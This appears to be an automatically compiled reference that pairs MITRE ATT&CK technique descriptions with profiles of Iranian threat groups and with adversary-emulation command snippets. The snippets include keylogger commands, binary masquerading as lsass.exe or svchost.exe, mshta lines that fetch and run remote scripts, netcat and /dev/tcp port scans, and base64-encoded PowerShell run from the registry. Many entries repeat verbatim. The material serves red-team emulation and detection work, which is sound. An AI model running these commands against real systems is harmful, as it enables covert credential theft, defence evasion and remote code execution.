CopyKittens
```

## Technique Name: Hidden Window

## Technique Description

```
Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.

### Windows
There are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)

### Mac
The configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)

```

## Technique Commands

```
Start-Process #{powershell_command}
Start-Process powershell.exe -WindowStyle hidden calc.exe
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Indicator Removal from Tools

## Technique Description

```
If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Input Capture

## Technique Description

```
Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

Keylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)
```

## Technique Commands

```
starting the keylogger:
keylogger {x86|x64} {pid}
when you're ready to view logs:
view -> keylog
when you're done keylogging:
jobs
jobkill {job id number}
starting the keylogger:
keyscan_start
when you're ready to get the logs:
keyscan_dump
when you're done keylogging:
keyscan_stop
Set-Location $PathToAtomicsFolder
.\T1056\src\Get-Keystrokes.ps1 -LogPath $env:TEMP\key.log
powershell.exe Get-Keystrokes -LogPath C:\key.log
powershell/collection/USBKeylogger
powershell/collection/USBKeylogger
powershell/collection/keylogger
powershell/collection/keylogger
python/collection/linux/keylogger
python/collection/linux/keylogger
python/collection/linux/xkeylogger
python/collection/linux/xkeylogger
python/collection/osx/keylogger
python/collection/osx/keylogger
```



# Actor: Group5

## Actor Description

```
[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)
```

## Actor Aliases

```
Group5
```

## Technique Name: Input Capture

## Technique Description

```
Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

Keylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)
```

## Technique Commands

```
starting the keylogger:
keylogger {x86|x64} {pid}
when you're ready to view logs:
view -> keylog
when you're done keylogging:
jobs
jobkill {job id number}
starting the keylogger:
keyscan_start
when you're ready to get the logs:
keyscan_dump
when you're done keylogging:
keyscan_stop
Set-Location $PathToAtomicsFolder
.\T1056\src\Get-Keystrokes.ps1 -LogPath $env:TEMP\key.log
powershell.exe Get-Keystrokes -LogPath C:\key.log
powershell/collection/USBKeylogger
powershell/collection/USBKeylogger
powershell/collection/keylogger
powershell/collection/keylogger
python/collection/linux/keylogger
python/collection/linux/keylogger
python/collection/linux/xkeylogger
python/collection/linux/xkeylogger
python/collection/osx/keylogger
python/collection/osx/keylogger
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Input Capture

## Technique Description

```
Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

Keylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)
```

## Technique Commands

```
starting the keylogger:
keylogger {x86|x64} {pid}
when you're ready to view logs:
view -> keylog
when you're done keylogging:
jobs
jobkill {job id number}
starting the keylogger:
keyscan_start
when you're ready to get the logs:
keyscan_dump
when you're done keylogging:
keyscan_stop
Set-Location $PathToAtomicsFolder
.\T1056\src\Get-Keystrokes.ps1 -LogPath $env:TEMP\key.log
powershell.exe Get-Keystrokes -LogPath C:\key.log
powershell/collection/USBKeylogger
powershell/collection/USBKeylogger
powershell/collection/keylogger
powershell/collection/keylogger
python/collection/linux/keylogger
python/collection/linux/keylogger
python/collection/linux/xkeylogger
python/collection/linux/xkeylogger
python/collection/osx/keylogger
python/collection/osx/keylogger
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Masquerading

## Technique Description

```
Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.

One variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. An example of this is when a common system utility or program is moved and renamed to avoid detection based on its usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.

A third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver file named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. A common use of this technique is with spearphishing attachments since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default. 

Adversaries may modify a binary's metadata, including such fields as icons, version, name of the product, description, and copyright, to better blend in with the environment and increase chances of deceiving a security analyst or product.(Citation: Threatexpress MetaTwin 2017)

### Windows
In another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)

An example of abuse of trusted locations in Windows would be the <code>C:\Windows\System32</code> directory. Examples of trusted binary names that can be given to malicious binares include "explorer.exe" and "svchost.exe".

### Linux
Another variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)

An example of abuse of trusted locations in Linux  would be the <code>/bin</code> directory. Examples of trusted binary names that can be given to malicious binaries include "rsyncd" and "dbus-inotifier". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)
```

## Technique Commands

```
cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
cmd.exe /c %SystemRoot%\Temp\lsass.exe
cp /bin/sh /tmp/crond
/tmp/crond
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
cmd.exe /c %APPDATA%\notepad.exe /B
copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
cmd.exe /c %APPDATA%\svchost.exe /B
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
cmd.exe /K %APPDATA%\taskhostw.exe
copy #{inputfile} ($env:TEMP + "\svchost.exe")
$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + "\svchost.exe")).Id
Stop-Process -ID $myT1036
copy $PathToAtomicsFolder\T1036\bin\t1036.exe ($env:TEMP + "\svchost.exe")
$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + "\svchost.exe")).Id
Stop-Process -ID $myT1036
copy #{inputfile} ($env:TEMP + "\svchost.exe")
$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + "\svchost.exe")).Id
Stop-Process -ID $myT1036
copy $env:ComSpec ($env:TEMP + "\svchost.exe")
$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + "\svchost.exe")).Id
Stop-Process -ID $myT1036
copy C:\Windows\System32\cmd.exe C:\lsm.exe
C:\lsm.exe /c echo T1036 > C:\T1036.txt
*.exe
\Recycle.bin
*.exe
\Users\All Users\
*.exe
\Users\Default\
*.exe
\Users\Public\
*.exe
\Perflogs\
*.exe
\config\systemprofile\
*.exe
\Windows\Fonts\
*.exe
\Windows\IME\
*.exe
\Windows\addins\
*.exe
\ProgramData\
csrsr.exe
csrss.exe
!=*\Windows\System32\
cssrss.exe
explorer.exe
!=*\Windows\System32\
iexplore.exe
isass.exe
lexplore.exe
lsm.exe
!=*\Windows\System32\
lssass.exe
mmc.exe
!=*\Windows\System32\
!=wininit.exe
lsass
run32dll.exe
rundII.exe
scvhost.exe
smss.exe
!=services.exe
svchost.exe
svchosts.exe
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Mshta

## Technique Description

```
Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
```

## Technique Commands

```
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file ..\..\atomics\T1170\src\powershell.ps1"":close")
mshta https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
vbscript|javascript|http|https\\windows\\.+\\mshta.exe
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Multi-Stage Channels

## Technique Description

```
Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.
```

## Technique Commands

```
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Network Service Scanning

## Technique Description

```
Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. 

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems.
```

## Technique Commands

```
for port in {1..65535};
do
  echo >/dev/tcp/192.168.1.1/$port && echo "port $port is open" || echo "port $port is closed" : ;
done
nmap -sS #{network_range} -p #{port}
telnet 192.168.1.1 #{port}
nc -nv 192.168.1.1 #{port}
nmap -sS 192.168.1.0/24 -p #{port}
telnet 192.168.1.1 #{port}
nc -nv 192.168.1.1 #{port}
rcpping.exe -s 127.0.0.1 -t ncacn_np
rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM
powershell/recon/find_fruit
powershell/recon/find_fruit
powershell/situational_awareness/network/get_sql_instance_domain
powershell/situational_awareness/network/get_sql_instance_domain
powershell/situational_awareness/network/get_sql_server_info
powershell/situational_awareness/network/get_sql_server_info
powershell/situational_awareness/network/portscan
powershell/situational_awareness/network/portscan
python/situational_awareness/network/find_fruit
python/situational_awareness/network/find_fruit
python/situational_awareness/network/port_scan
python/situational_awareness/network/port_scan
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Network Service Scanning

## Technique Description

```
Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. 

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems.
```

## Technique Commands

```
for port in {1..65535};
do
  echo >/dev/tcp/192.168.1.1/$port && echo "port $port is open" || echo "port $port is closed" : ;
done
nmap -sS #{network_range} -p #{port}
telnet 192.168.1.1 #{port}
nc -nv 192.168.1.1 #{port}
nmap -sS 192.168.1.0/24 -p #{port}
telnet 192.168.1.1 #{port}
nc -nv 192.168.1.1 #{port}
rcpping.exe -s 127.0.0.1 -t ncacn_np
rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM
powershell/recon/find_fruit
powershell/recon/find_fruit
powershell/situational_awareness/network/get_sql_instance_domain
powershell/situational_awareness/network/get_sql_instance_domain
powershell/situational_awareness/network/get_sql_server_info
powershell/situational_awareness/network/get_sql_server_info
powershell/situational_awareness/network/portscan
powershell/situational_awareness/network/portscan
python/situational_awareness/network/find_fruit
python/situational_awareness/network/find_fruit
python/situational_awareness/network/port_scan
python/situational_awareness/network/port_scan
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Network Service Scanning

## Technique Description

```
Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. 

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems.
```

## Technique Commands

```
for port in {1..65535};
do
  echo >/dev/tcp/192.168.1.1/$port && echo "port $port is open" || echo "port $port is closed" : ;
done
nmap -sS #{network_range} -p #{port}
telnet 192.168.1.1 #{port}
nc -nv 192.168.1.1 #{port}
nmap -sS 192.168.1.0/24 -p #{port}
telnet 192.168.1.1 #{port}
nc -nv 192.168.1.1 #{port}
rcpping.exe -s 127.0.0.1 -t ncacn_np
rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM
powershell/recon/find_fruit
powershell/recon/find_fruit
powershell/situational_awareness/network/get_sql_instance_domain
powershell/situational_awareness/network/get_sql_instance_domain
powershell/situational_awareness/network/get_sql_server_info
powershell/situational_awareness/network/get_sql_server_info
powershell/situational_awareness/network/portscan
powershell/situational_awareness/network/portscan
python/situational_awareness/network/find_fruit
python/situational_awareness/network/find_fruit
python/situational_awareness/network/port_scan
python/situational_awareness/network/port_scan
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Network Sniffing

## Technique Description

```
Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.
```

## Technique Commands

```
tcpdump -c 5 -nnni ens33
tshark -c 5 -i ens33
tcpdump -c 5 -nnni en0A
tshark -c 5 -i en0A
"c:\Program Files\Wireshark\tshark.exe" -i Ethernet0 -c 5
c:\windump.exe
& "c:\Program Files\Wireshark\tshark.exe" -i Ethernet0 -c 5
& c:\windump.exe
powershell/collection/packet_capture
powershell/collection/packet_capture
python/collection/linux/sniffer
python/collection/linux/sniffer
python/collection/osx/sniffer
python/collection/osx/sniffer
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Obfuscated Files or Information

## Technique Description

```
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)
```

## Technique Commands

```
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

powershell.exe -EncodedCommand $EncodedCommand
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))"
[a-z0-9]{1}.exe
*.exe \*.exe\:Zone.Identifier:$DATA"
```



# Actor: Group5

## Actor Description

```
[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)
```

## Actor Aliases

```
Group5
```

## Technique Name: Obfuscated Files or Information

## Technique Description

```
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

